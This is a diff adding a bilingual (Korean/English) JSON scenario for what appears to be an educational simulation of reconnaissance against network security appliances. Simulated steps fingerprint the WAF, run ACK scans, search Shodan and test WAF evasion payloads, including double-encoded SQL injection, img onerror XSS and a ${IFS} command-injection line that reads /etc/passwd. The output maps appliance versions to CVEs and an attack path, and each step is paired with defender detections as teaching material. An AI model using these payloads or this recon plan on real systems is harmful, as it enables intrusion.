@@ -1,0 +1,182 @@
+{
+  "id": "T1590.006",
+  "title": "네트워크 보안 장비 수집 시뮬레이션",
+  "titleEn": "Network Security Appliances Gathering Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 WAF 탐지", "labelEn": "🔍 WAF Detection", "steps": [0, 1] },
+    { "label": "🛡️ 방화벽/IDS 분석", "labelEn": "🛡️ FW/IDS Analysis", "steps": [2, 3] },
+    { "label": "⚔️ 우회 전략", "labelEn": "⚔️ Bypass Strategy", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "waf", "label": "WAF", "x": 175, "y": 30 },
+    { "id": "firewall", "label": "Firewall", "x": 175, "y": 90 },
+    { "id": "ids", "label": "IDS/IPS", "x": 300, "y": 30 },
+    { "id": "vpngw", "label": "VPN Gateway", "x": 300, "y": 90 },
+    { "id": "internal", "label": "Internal Net", "x": 450, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "waf", "minStep": 0 },
+    { "from": "attacker", "to": "firewall", "minStep": 2 },
+    { "from": "waf", "to": "ids", "minStep": 1 },
+    { "from": "firewall", "to": "vpngw", "minStep": 3 },
+    { "from": "ids", "to": "internal", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "security_audit.pdf", "icon": "🛡️", "alert": true },
+    { "name": "{companyName} Recon", "icon": "📁" },
+    { "name": "bypass_plan.txt", "icon": "📄" }
+  ],
+  "steps": [
+    {
+      "cmd": "wafw00f https://{companyName}.com -a",
+      "out": "[*] Checking https://{companyName}.com\n[+] The site https://{companyName}.com is behind Cloudflare (Cloudflare Inc.)\n[*] Reason: Response headers contain 'cf-ray' and 'cf-cache-status'\n[*] Additional indicators:\n    Server: cloudflare\n    X-Content-Type-Options: nosniff\n    CF-Cache-Status: DYNAMIC\n    CF-RAY: 8a1b2c3d4e5f6789-ICN\n\n[*] WAF Features detected:\n    - Bot Management: ACTIVE\n    - Rate Limiting: ACTIVE\n    - Challenge Pages: ACTIVE (Turnstile)\n    - DDoS Protection: ACTIVE (L7)\n    - Custom Rules: DETECTED (3+ custom block rules)\n\n[+] Number of requests: 14",
+      "def": "[WAF] WAF fingerprinting attempt detected - wafw00f signature",
+      "defAction": "Source: 10.0.1.45\nTarget: {companyName}.com\nAction: Bot management challenge activated, source IP rate-limited",
+      "desc": "wafw00f로 웹 애플리케이션 방화벽(WAF)의 종류와 활성 기능을 탐지합니다.",
+      "descEn": "Detect WAF type and active features using wafw00f.",
+      "stepTitle": "wafw00f WAF 탐지",
+      "stepTitleEn": "wafw00f WAF Detection",
+      "feynman": "wafw00f는 웹사이트 앞에 어떤 '보안 경비원(WAF)'이 서 있는지 알아내는 도구입니다. HTTP 응답에서 'cf-ray' 같은 단서를 찾아 Cloudflare WAF를 식별합니다. 봇 관리, 속도 제한, DDoS 보호 등 어떤 보안 기능이 활성화되어 있는지도 파악하여 우회 전략을 수립합니다.",
+      "feynmanEn": "wafw00f identifies which 'security guard (WAF)' stands before a website. It finds clues like 'cf-ray' in HTTP responses to identify Cloudflare WAF. It also determines which security features are active (bot management, rate limiting, DDoS protection) for bypass strategy planning.",
+      "expert": "wafw00f는 HTTP 응답 헤더, 에러 페이지, 쿠키, 행동 패턴을 분석하여 WAF를 핑거프린팅합니다. Cloudflare의 cf-ray 헤더는 ICN(인천) PoP를 나타내며, Turnstile 챌린지와 L7 DDoS 보호가 활성화되어 있습니다. 3개 이상의 커스텀 차단 규칙이 감지되어 맞춤형 보안 정책이 적용되어 있습니다.",
+      "expertEn": "wafw00f fingerprints WAFs by analyzing HTTP response headers, error pages, cookies, and behavioral patterns. Cloudflare's cf-ray header shows ICN (Incheon) PoP, with Turnstile challenge and L7 DDoS protection active. 3+ custom block rules indicate tailored security policies.",
+      "defTooltip": "🛡️ WAF: WAF 핑거프린팅 시도 감지 - wafw00f 시그니처",
+      "defTooltipEn": "🛡️ WAF: WAF fingerprinting attempt detected - wafw00f signature",
+      "hackerLog": {
+        "title": "wafw00f.log",
+        "lines": [
+          { "log": "The site is behind Cloudflare (Cloudflare Inc.)", "desc": "💡 Cloudflare WAF 확인 - Cloudflare 전용 우회 기법을 준비해야 합니다" },
+          { "log": "Bot Management: ACTIVE", "desc": "💡 봇 관리 활성화 - 자동화 도구가 차단될 수 있습니다" },
+          { "log": "Custom Rules: DETECTED (3+ custom block rules)", "desc": "💡 커스텀 차단 규칙 - 맞춤형 우회 페이로드가 필요합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "wafw00f", "desc": "웹 애플리케이션 방화벽(WAF)의 종류를 자동으로 탐지하는 오픈소스 도구. HTTP 응답 분석으로 40+ WAF 제품을 식별합니다" },
+        { "name": "WAF (Web Application Firewall)", "desc": "웹 애플리케이션을 SQL Injection, XSS 등의 공격으로부터 보호하는 보안 장비. 요청을 검사하고 악성 트래픽을 차단합니다" }
+      ]
+    },
+    {
+      "cmd": "nmap --script http-waf-detect,http-waf-fingerprint -p 443 {companyName}.com && nmap -sA -p 1-1000 198.51.100.25",
+      "out": "PORT    STATE SERVICE\n443/tcp open  https\n| http-waf-detect: IDS/IPS/WAF detected\n| http-waf-fingerprint:\n|   Detected WAF: Cloudflare\n|   WAF type: Cloud-based\n|   Blocking: Yes (403 Forbidden on attack patterns)\n\n--- ACK Scan Results (Origin Server 198.51.100.25) ---\nPORT     STATE      SERVICE\n22/tcp   unfiltered ssh\n80/tcp   unfiltered http\n443/tcp  unfiltered https\n3306/tcp filtered   mysql\n8443/tcp unfiltered https-alt\n\nFirewall Analysis:\n  Ports 22,80,443,8443: No stateful filtering (UNFILTERED)\n  Port 3306: Stateful firewall active (FILTERED)\n  Estimated firewall type: Simple packet filter (not stateful on most ports)",
+      "def": "[IDS] Nmap ACK scan and WAF fingerprinting detected",
+      "defAction": "Source: 10.0.1.45\nTarget: {companyName}.com + 198.51.100.25\nAction: ACK scan blocked, firewall rules audit initiated",
+      "desc": "Nmap NSE로 WAF를 추가 검증하고, ACK 스캔으로 방화벽의 상태형 필터링 여부를 확인합니다.",
+      "descEn": "Verify WAF with Nmap NSE and check firewall stateful filtering with ACK scan.",
+      "stepTitle": "Nmap WAF 검증 + 방화벽 ACK 스캔",
+      "stepTitleEn": "Nmap WAF Verification + Firewall ACK Scan",
+      "feynman": "Nmap의 ACK 스캔은 방화벽이 '상태형(stateful)'인지 '단순(stateless)'인지 구별합니다. ACK 패킷에 대해 RST 응답이 오면 '필터링 안 됨(unfiltered)', 응답이 없으면 '필터링됨(filtered)'입니다. MySQL(3306)만 필터링되고 나머지는 필터링되지 않는다는 것은 방화벽이 대부분의 포트를 제대로 보호하지 않고 있다는 뜻입니다.",
+      "feynmanEn": "Nmap ACK scan distinguishes 'stateful' from 'stateless' firewalls. RST response to ACK means 'unfiltered', no response means 'filtered'. Only MySQL (3306) being filtered while others are unfiltered means the firewall isn't properly protecting most ports.",
+      "expert": "ACK 스캔(-sA)은 TCP ACK 패킷을 보내 상태형 방화벽의 존재를 확인합니다. unfiltered 응답은 상태형 필터링이 없음을 의미하며, 포트 3306만 filtered인 것은 MySQL에 대한 별도 ACL만 적용된 것입니다. 이는 단순 패킷 필터로 상태형 검사가 대부분의 포트에 적용되지 않는 보안 결함입니다.",
+      "expertEn": "ACK scan (-sA) sends TCP ACK packets to detect stateful firewalls. 'Unfiltered' means no stateful filtering, and only port 3306 being filtered indicates only MySQL has a separate ACL. This simple packet filter lacks stateful inspection on most ports - a security deficiency.",
+      "defTooltip": "🔍 IDS: Nmap ACK 스캔 및 WAF 핑거프린팅 감지",
+      "defTooltipEn": "🔍 IDS: Nmap ACK scan and WAF fingerprinting detected",
+      "hackerLog": {
+        "title": "nmap_fw_scan.log",
+        "lines": [
+          { "log": "22/tcp unfiltered ssh", "desc": "💡 SSH가 상태형 필터링 없이 노출 - 직접 접근 가능합니다" },
+          { "log": "8443/tcp unfiltered https-alt", "desc": "💡 Tomcat 관리 포트가 필터링 없이 노출 - 고위험 공격 벡터" },
+          { "log": "Estimated firewall type: Simple packet filter", "desc": "💡 단순 패킷 필터 - 상태형 방화벽보다 우회가 훨씬 쉽습니다" }
+        ]
+      },
+      "terms": [
+        { "name": "ACK Scan", "desc": "TCP ACK 패킷을 보내 방화벽의 상태형 필터링 여부를 확인하는 스캔 기법. 포트가 열려있는지가 아니라 필터링되는지를 확인합니다" },
+        { "name": "Stateful Firewall", "desc": "TCP 연결의 상태(SYN, ESTABLISHED 등)를 추적하여 비정상 패킷을 차단하는 방화벽. Stateless보다 보안이 강력합니다" }
+      ]
+    },
+    {
+      "cmd": "shodan search \"org:{companyName}\" --fields ip_str,port,product,version,os",
+      "out": "IP: 198.51.100.1   Port: 443   Product: Fortinet FortiGate  Version: 7.2.5  OS: FortiOS\nIP: 198.51.100.1   Port: 10443 Product: Fortinet FortiGate  Version: 7.2.5  OS: FortiOS\nIP: 198.51.100.1   Port: 541   Product: FortiManager       Version: 7.4.1  OS: FortiOS\nIP: 198.51.100.2   Port: 443   Product: Palo Alto PAN-OS   Version: 11.0.2 OS: PAN-OS\nIP: 198.51.100.2   Port: 4443  Product: Palo Alto GlobalProtect Version: 11.0.2\nIP: 198.51.100.3   Port: 443   Product: Cisco ASA          Version: 9.16.4 OS: Cisco ASA\nIP: 198.51.100.3   Port: 8443  Product: Cisco AnyConnect   Version: 4.10\nIP: 198.51.100.5   Port: 443   Product: Zscaler ZIA Proxy  Version: unknown\n\nResults: 8 services across 4 IPs",
+      "def": "[Threat Intel] Shodan search targeting organization security appliances",
+      "defAction": "Source: Shodan API queries\nTarget: {companyName} security infrastructure\nAction: Exposed management interfaces flagged, vendor advisory review",
+      "desc": "Shodan에서 조직의 보안 장비(방화벽, VPN, 프록시) 종류와 버전을 검색합니다.",
+      "descEn": "Search Shodan for organization's security appliances (firewall, VPN, proxy) types and versions.",
+      "stepTitle": "Shodan 보안 장비 인벤토리 검색",
+      "stepTitleEn": "Shodan Security Appliance Inventory Search",
+      "feynman": "Shodan에서 회사 이름으로 검색하면 어떤 보안 장비를 사용하는지 한눈에 볼 수 있습니다. Fortinet FortiGate(방화벽), Palo Alto PAN-OS(NGFW), Cisco ASA(방화벽+VPN), Zscaler(프록시)를 사용 중입니다. 관리 인터페이스(10443, 4443, 8443, 541)가 외부에 노출된 것은 매우 위험합니다.",
+      "feynmanEn": "Searching by company name on Shodan reveals all security appliances: Fortinet FortiGate (firewall), Palo Alto PAN-OS (NGFW), Cisco ASA (firewall+VPN), Zscaler (proxy). Exposed management interfaces (10443, 4443, 8443, 541) are extremely dangerous.",
+      "expert": "FortiGate 7.2.5는 CVE-2023-27997(Heap overflow, pre-auth RCE)의 영향 범위입니다. PAN-OS 11.0.2는 CVE-2024-0012(관리 인터페이스 인증 우회)의 대상입니다. FortiManager 7.4.1의 외부 노출은 CVE-2024-47575(FortiJump)에 취약할 수 있으며, 이는 방화벽 전체를 원격 제어할 수 있는 치명적 취약점입니다.",
+      "expertEn": "FortiGate 7.2.5 is within CVE-2023-27997 (Heap overflow, pre-auth RCE) scope. PAN-OS 11.0.2 is targetable by CVE-2024-0012 (admin interface auth bypass). FortiManager 7.4.1 external exposure may be vulnerable to CVE-2024-47575 (FortiJump), enabling remote control of all managed firewalls.",
+      "defTooltip": "🔍 위협정보: 조직 보안 장비 대상 Shodan 검색 감지",
+      "defTooltipEn": "🔍 Threat Intel: Shodan search targeting organization security appliances",
+      "hackerLog": {
+        "title": "shodan_appliances.log",
+        "lines": [
+          { "log": "Fortinet FortiGate Version:7.2.5", "desc": "💡 FortiGate 7.2.5는 CVE-2023-27997(RCE) 취약점 범위입니다" },
+          { "log": "FortiManager Version:7.4.1 Port:541", "desc": "💡 FortiManager 외부 노출 - 모든 관리 방화벽을 원격 제어할 수 있습니다" },
+          { "log": "Palo Alto PAN-OS Version:11.0.2", "desc": "💡 PAN-OS 11.0.2는 관리 인터페이스 인증 우회 취약점 대상" }
+        ]
+      },
+      "terms": [
+        { "name": "NGFW (Next-Generation Firewall)", "desc": "전통적 방화벽에 IPS, 애플리케이션 인식, 딥 패킷 인스펙션 등을 추가한 차세대 방화벽. Palo Alto, Fortinet이 대표적입니다" },
+        { "name": "FortiManager", "desc": "여러 FortiGate 방화벽을 중앙에서 관리하는 도구. 침해 시 관리하는 모든 방화벽을 제어할 수 있어 최고 가치 타겟입니다" }
+      ]
+    },
+    {
+      "cmd": "python3 ids_evasion_test.py --target {companyName}.com --payloads sqli,xss,rce --encoding unicode,hex,double --output ids_test.json",
+      "out": "[*] IDS/IPS Evasion Testing for {companyName}.com\n\n=== SQLi Payload Tests ===\nOriginal: ' OR 1=1--           → BLOCKED (403)\nUnicode:  %u0027%u004F%u0052   → BLOCKED (403)\nHex:      %27%20OR%201%3D1--   → BLOCKED (403)\nDouble:   %%2727 OR 1=1--      → PASSED (200) ⚠️\nCase:     ' oR 1=1--           → PASSED (200) ⚠️\n\n=== XSS Payload Tests ===\nOriginal: <script>alert(1)</script>  → BLOCKED\nSVG:      <svg onload=alert(1)>      → BLOCKED\nIMG:      <img src=x onerror=alert> → PASSED (200) ⚠️\n\n=== RCE Payload Tests ===\nOriginal: ;cat /etc/passwd      → BLOCKED\nNewline:  %0acat%20/etc/passwd  → BLOCKED\nPipe:     |cat${IFS}/etc/passwd → PASSED (200) ⚠️\n\nEvasion Success Rate: 4/15 (26.7%)\nWAF Bypass Methods: Double encoding, case manipulation, alternative tags",
+      "def": "[WAF/IDS] Multiple evasion attempts detected - attack pattern testing",
+      "defAction": "Source: 10.0.1.45\nTarget: {companyName}.com WAF\nAction: Source IP blocked, WAF rules updated for detected bypass methods",
+      "desc": "다양한 인코딩과 우회 기법으로 WAF/IDS 규칙의 약점을 테스트합니다.",
+      "descEn": "Test WAF/IDS rule weaknesses using various encoding and evasion techniques.",
+      "stepTitle": "WAF/IDS 우회 기법 테스트",
+      "stepTitleEn": "WAF/IDS Evasion Technique Testing",
+      "feynman": "보안 장비도 완벽하지 않습니다. 공격 코드를 다양한 방식으로 '변장'시켜 통과할 수 있는지 테스트합니다. 이중 인코딩(%%27), 대소문자 변환(oR), 대체 HTML 태그(img), 쉘 변수(${IFS})를 사용하면 15개 공격 중 4개(26.7%)가 WAF를 통과했습니다. WAF가 모든 공격을 막지는 못합니다.",
+      "feynmanEn": "Security appliances aren't perfect. Testing if attack code 'disguised' in various ways can pass through. Using double encoding (%%27), case manipulation (oR), alternative HTML tags (img), and shell variables (${IFS}), 4 out of 15 attacks (26.7%) bypassed the WAF.",
+      "expert": "WAF 우회 테스트에서 이중 URL 인코딩(%%27→%27→'), 대소문자 변환, IMG onerror XSS, IFS 변수를 이용한 RCE가 성공했습니다. Cloudflare의 관리형 규칙은 일반적 패턴을 잘 차단하지만, 비표준 인코딩과 대체 실행 컨텍스트에는 약점이 있습니다. 커스텀 규칙 추가와 정규 표현식 강화가 필요합니다.",
+      "expertEn": "WAF bypass tests succeeded with double URL encoding (%%27→%27→'), case manipulation, IMG onerror XSS, and IFS variable RCE. Cloudflare managed rules block common patterns well but have weaknesses against non-standard encoding and alternative execution contexts. Custom rule additions and regex hardening needed.",
+      "defTooltip": "⚔️ WAF/IDS: 다중 우회 시도 감지 - 공격 패턴 테스트",
+      "defTooltipEn": "⚔️ WAF/IDS: Multiple evasion attempts detected - attack pattern testing",
+      "hackerLog": {
+        "title": "ids_evasion.log",
+        "lines": [
+          { "log": "Double: %%2727 OR 1=1-- → PASSED (200)", "desc": "💡 이중 인코딩으로 SQL Injection WAF 우회 성공!" },
+          { "log": "IMG: <img src=x onerror=alert> → PASSED", "desc": "💡 IMG 태그 XSS가 WAF를 통과 - 대체 태그는 차단이 어렵습니다" },
+          { "log": "Evasion Success Rate: 26.7%", "desc": "💡 4/15 우회 성공 - WAF는 완벽하지 않으며 추가 방어 계층이 필요합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "WAF Evasion", "desc": "웹 애플리케이션 방화벽의 규칙을 우회하여 공격 페이로드를 전달하는 기법. 인코딩, 난독화, 대체 구문 등을 사용합니다" },
+        { "name": "Double Encoding", "desc": "URL 인코딩을 두 번 적용하는 우회 기법. WAF가 한 번만 디코딩하면 공격 패턴을 탐지하지 못합니다" }
+      ]
+    },
+    {
+      "cmd": "python3 security_appliance_report.py --wafw00f wafw00f.log --nmap nmap_fw.txt --shodan shodan_appliances.json --evasion ids_test.json --output security_audit.pdf",
+      "out": "[+] Building security appliance intelligence report...\n\n=== SECURITY APPLIANCE INTELLIGENCE REPORT ===\n\nTarget: {companyName}.com\n\nSecurity Stack:\n  WAF: Cloudflare (Cloud-based)\n  Firewall: Fortinet FortiGate 7.2.5, Palo Alto PAN-OS 11.0.2, Cisco ASA 9.16.4\n  VPN: Cisco AnyConnect 4.10, FortiGate SSL-VPN\n  Proxy: Zscaler ZIA\n  Management: FortiManager 7.4.1\n\nCritical Vulnerabilities:\n  1. FortiGate 7.2.5 → CVE-2023-27997 (Pre-auth RCE, CVSS 9.8)\n  2. PAN-OS 11.0.2 → CVE-2024-0012 (Admin auth bypass, CVSS 9.1)\n  3. FortiManager 7.4.1 → CVE-2024-47575 (FortiJump, CVSS 9.8)\n\nWAF Bypass Methods (4/15 success):\n  - Double URL encoding for SQLi\n  - Case manipulation for SQLi\n  - IMG onerror for XSS\n  - IFS variable for RCE\n\nRecommended Attack Path:\n  1. Exploit FortiManager (CVE-2024-47575) → Control all firewalls\n  2. Use WAF bypass methods for web app attacks\n  3. Exploit FortiGate VPN for internal access\n\n[+] Report saved to security_audit.pdf",
+      "def": "[SIEM] Complete security appliance reconnaissance campaign detected",
+      "defAction": "Source: Correlation of security appliance recon\nTarget: {companyName} security infrastructure\nAction: Incident #2025-0105 created, emergency patching initiated",
+      "desc": "모든 보안 장비 정보를 통합하여 취약점 매핑과 우회 전략 보고서를 생성합니다.",
+      "descEn": "Consolidate all security appliance intelligence into vulnerability mapping and bypass strategy report.",
+      "stepTitle": "보안 장비 통합 취약점 보고서",
+      "stepTitleEn": "Security Appliance Vulnerability Report",
+      "feynman": "모든 보안 장비 정보를 합쳐서 '성의 방어 약점 지도'를 완성합니다. FortiManager를 공격하면 모든 방화벽을 제어할 수 있고(CVE-2024-47575), WAF는 4가지 방법으로 우회 가능하며, FortiGate VPN을 통해 내부에 침투할 수 있습니다. 보안 장비 자체가 가장 큰 취약점이 된 아이러니한 상황입니다.",
+      "feynmanEn": "All security appliance info combined into a 'castle defense weakness map.' Attacking FortiManager controls all firewalls (CVE-2024-47575), WAF is bypassable 4 ways, and FortiGate VPN enables internal penetration. Ironically, security appliances themselves became the biggest vulnerability.",
+      "expert": "보안 장비 정찰 결과 3개의 CVSS 9.0+ 취약점이 식별됐습니다. FortiManager(CVE-2024-47575)는 관리하는 모든 FortiGate의 원격 제어를 가능하게 하는 최고 위험 취약점입니다. Defense-in-depth 관점에서 보안 장비 관리 인터페이스의 네트워크 격리, 긴급 패치, WAF 커스텀 규칙 추가가 시급합니다.",
+      "expertEn": "Security appliance recon identified 3 CVSS 9.0+ vulnerabilities. FortiManager (CVE-2024-47575) is the highest risk, enabling remote control of all managed FortiGates. From defense-in-depth perspective, immediate network isolation of management interfaces, emergency patching, and WAF custom rule additions are critical.",
+      "defTooltip": "🗺️ SIEM: 보안 장비 정찰 캠페인 완료 감지",
+      "defTooltipEn": "🗺️ SIEM: Complete security appliance reconnaissance campaign detected",
+      "hackerLog": {
+        "title": "security_audit.log",
+        "lines": [
+          { "log": "FortiManager 7.4.1 → CVE-2024-47575 (CVSS 9.8)", "desc": "💡 FortiJump - 모든 관리 방화벽을 원격 제어할 수 있는 치명적 취약점" },
+          { "log": "WAF Bypass: 4/15 success (26.7%)", "desc": "💡 WAF가 26.7%의 공격을 놓침 - 추가 방어 계층이 반드시 필요합니다" },
+          { "log": "Attack Path: FortiManager → All Firewalls", "desc": "💡 보안 장비 관리 서버를 통한 연쇄 침해가 가능합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Defense in Depth", "desc": "여러 층의 보안 장치를 배치하여 하나가 뚫려도 다른 층이 방어하는 보안 전략. WAF+IDS+방화벽+EDR 등을 조합합니다" },
+        { "name": "CVE-2024-47575 (FortiJump)", "desc": "FortiManager의 치명적 취약점으로, 인증 없이 관리하는 모든 FortiGate 방화벽을 원격 제어할 수 있습니다. CVSS 9.8" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "bash", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "wafw00f (PID: 10101)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "nmap --script http-waf (PID: 10178)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "shodan search (PID: 10245)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "python3 ids_evasion_test.py (PID: 10312)", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "python3 security_appliance_report.py (PID: 10389)", "depth": 1, "alert": false, "minStep": 4 }
+  ]
+}
